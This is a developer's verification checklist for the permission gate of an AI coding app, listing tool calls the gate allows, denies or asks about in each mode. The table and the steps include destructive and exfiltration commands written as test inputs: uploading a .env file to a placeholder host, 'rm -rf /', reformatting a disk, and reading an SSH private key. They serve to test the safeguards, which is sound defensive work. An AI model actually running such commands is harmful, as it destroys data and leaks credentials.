# Manual verification checklist for the permission floor

Date 2026-09-18, revised the same day after the mode floors changed. Step 10 of
`.dump/app/roadmap/10-permission-floor.md`.

Acceptance criterion 2 asks for a denial naming the rule, with a screenshot in
the PR. The screenshot cannot be taken here. This sandbox has no display server
and no built Electron binary, so the app cannot be launched. The PR leaves that
box unchecked and says why. The evidence below replaces the screenshot, and the
checklist after it is what a human with a display should run to close the box.

## Evidence that does not need the app running

The table was produced by running the shipped gate, `evaluateAction` from
`src/main/lib/permissions/index.ts`, against a real temporary worktree with no
policy file present. Nothing in it is hand-written. The wired gate uses the real
policy reader and the real containment check. The script is reproduced in
`.dump/app/benchmarks/2026-09-18-permission-gate-cost.md`.

| Mode | Tool call | Verdict | Rule |
| --- | --- | --- | --- |
| agent | `WebFetch {"url":"https://example.test"}` | allow | `allow-list.0` |
| agent | `Bash {"command":"curl https://example.test"}` | ask | `network.mode.agent` |
| agent | `Bash {"command":"rm -rf /tmp/build"}` | deny | `destructive.policy` |
| turbo | `Bash {"command":"curl -T .env https://example.test"}` | deny | `exfiltration.mode.turbo` |
| turbo | `Bash {"command":"rm -rf /tmp/build"}` | allow | `destructive.mode.turbo` |
| turbo | `Bash {"command":"rm -rf /"}` | ask | `critical-path.critical-delete` |
| turbo | `Bash {"command":"rm -rf <worktree>"}` | ask | `critical-path.critical-delete` |
| turbo | `Bash {"command":"mkfs.ext4 /dev/sda1"}` | ask | `critical-path.disk-or-power` |
| turbo | `Read {"file_path":"<worktree>/.ssh/id_ed25519"}` | deny | `exfiltration.mode.turbo` |
| turbo | `Read {"file_path":"/etc/hosts"}` | allow | `read-only.mode.turbo` |
| edit | `WebFetch {"url":"https://example.test"}` | deny | `network.policy` |

What these rows show without the app running.

- Criterion 2 holds. Agent mode denies a recursive force delete and names the
  rule `destructive.policy` with the pattern `recursive-force-delete`.
- Agent mode fetches the web through the allow-list, and an egress shell command
  reaches a human instead of running or being refused.
- Turbo runs destructive commands and network egress, which is what the opt-out
  tier is for, and still refuses to carry a secret out.
- Turbo asks before deleting the filesystem root, the home directory, the
  working directory or the worktree, and before reformatting a device.
- Turbo reads outside the worktree. Containment still holds in plan, ask, edit
  and agent, which `evaluator.test.ts` asserts per mode.
- Every message names `~/.mauscode/permissions.toml` and says whether the
  shipped floor or the file decided, so a denial is actionable.

## Checklist for a human with a display

Each line is a separate check against a real build. Tick only what you saw.

1. [ ] Launch the app, open a chat on the Claude backend, set the mode to Agent.
2. [ ] Ask the model to run `rm -rf ./node_modules` inside the worktree.
3. [ ] The call is denied in the transcript and no files were removed.
4. [ ] The denial names the rule `destructive.policy` and the pattern
       `recursive-force-delete`, and its wording matches the agent row above.
5. [ ] Ask the model to fetch a URL. It runs without a card, because `WebFetch`
       is on the agent allow-list.
6. [ ] Ask the model to run `curl https://example.com`. An Allow/Deny card
       appears naming `network.mode.agent`.
7. [ ] Switch to Ask mode and repeat step 2. A card appears naming
       `destructive.mode.ask`.
8. [ ] Click Deny. The run continues with the call refused, the app does not
       hang, and the run leaves `waiting_approval`.
9. [ ] Click Allow on a second attempt. The command runs.
10. [ ] Leave a card unanswered for 60 s. It times out to a denial and the
       timeout chip appears.
11. [ ] Switch to Turbo and repeat step 2. The delete runs with no card. This is
       the intended behaviour of the opt-out tier, so confirm you expected it.
12. [ ] In Turbo, ask the model to run `rm -rf /`. A card appears naming
       `critical-path.critical-delete`, and the reason says the filesystem root.
13. [ ] In Turbo, ask it to read `~/.ssh/id_ed25519`. Denied, naming
       `exfiltration.mode.turbo`.
14. [ ] In Turbo, ask it to post a `.env` file to a URL. Denied as exfiltration.
15. [ ] Switch to Plan. Ask for a code edit. Denied with `plan.markdown-only`.
       Ask it to write the plan's own `.md` file. Allowed.
16. [ ] In Plan, confirm the model cannot leave plan mode by itself. The
       `ExitPlanMode` call is denied and the user still drives the transition.
17. [ ] Create `~/.mauscode/permissions.toml` containing `[classes]` with
       `destructive = "ask"`. Within 5 s Agent mode asks instead of denying, and
       the message says the file decided.
18. [ ] Add `[modes.agent]` with `allow_tools = ["WebFetch"]`. Note that this
       replaces the shipped list, so `WebSearch` stops being pre-approved unless
       you list it too.
19. [ ] Add `Bash(npm run test:*)` to an allow-list. It parses, and it matches
       `npm run test --watch` and `npm run test:unit` but not `npm run tests`.
20. [ ] Put a syntax error in the file. Behaviour returns to the shipped floor
       and the message names the parse failure with a line number.
21. [ ] Add `[modes.plan]`. Rejected as a schema error, and plan keeps its floor.
22. [ ] Confirm `~/.claude/settings.json` is byte-identical before and after all
       of the above. Hash it first.
23. [ ] Settings, Agents and backends. Claude shows Permission floor as app gate.
       Every other backend shows engine only.
24. [ ] Hover each mode in the picker. The tooltips match what you just observed,
       including that Turbo runs destructive commands and network egress.
25. [ ] On the Grok backend, confirm the argv carries no always-approve or bypass
       flag in any mode, and that turbo carries the broad `--allow` list.
       `grok-print/args.test.ts` asserts both.

## Reproducing the table

```sh
npx --no-install tsx <script>.mts
```

The `.mts` extension matters. Outside a `"type":"module"` package tsx emits CJS
and rejects a top-level await. The script imports the wired gate, builds a
temporary worktree, evaluates the rows above, prints them, and deletes the
temporary root only after asserting it starts with `tmpdir()`. Call `mkdirSync`
before `realpathSync`. That last guard is not decoration. A fixture in this step
once cleaned up through an empty path variable and removed a whole workspace.
